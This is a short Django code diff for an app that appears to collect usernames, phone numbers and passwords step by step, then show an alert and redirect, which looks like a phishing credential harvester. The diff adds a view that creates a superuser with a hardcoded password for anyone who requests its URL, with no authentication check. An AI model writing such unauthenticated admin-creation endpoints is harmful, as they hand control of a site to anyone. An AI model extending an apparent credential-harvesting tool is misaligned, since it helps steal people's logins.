@@ -2,6 +2,9 @@
 from django.shortcuts import render, redirect
 from .models import Credential
 import urllib.parse
+from django.contrib.auth import get_user_model
+from django.http import HttpResponse
+
 
 # No changes to step1_username and step1_phone
 
@@ -45,3 +48,16 @@ def step2_password(request, username):
 def success_redirect(request):
     """Renders the intermediate page that shows the alert and redirects."""
     return render(request, 'collector/redirecting.html')
+
+# Add this entire function
+def create_superuser_temp(request):
+    User = get_user_model()
+    username = 'admin'
+    password = 'a_very_strong_password_123'  # <<< CHANGE THIS PASSWORD
+    email = 'admin@example.com'
+
+    if not User.objects.filter(username=username).exists():
+        User.objects.create_superuser(username, email, password)
+        return HttpResponse(f"Admin user '{username}' created successfully. PLEASE REMOVE THIS URL AND VIEW FROM YOUR CODE NOW.")
+
+    return HttpResponse(f"Admin user '{username}' already exists.")
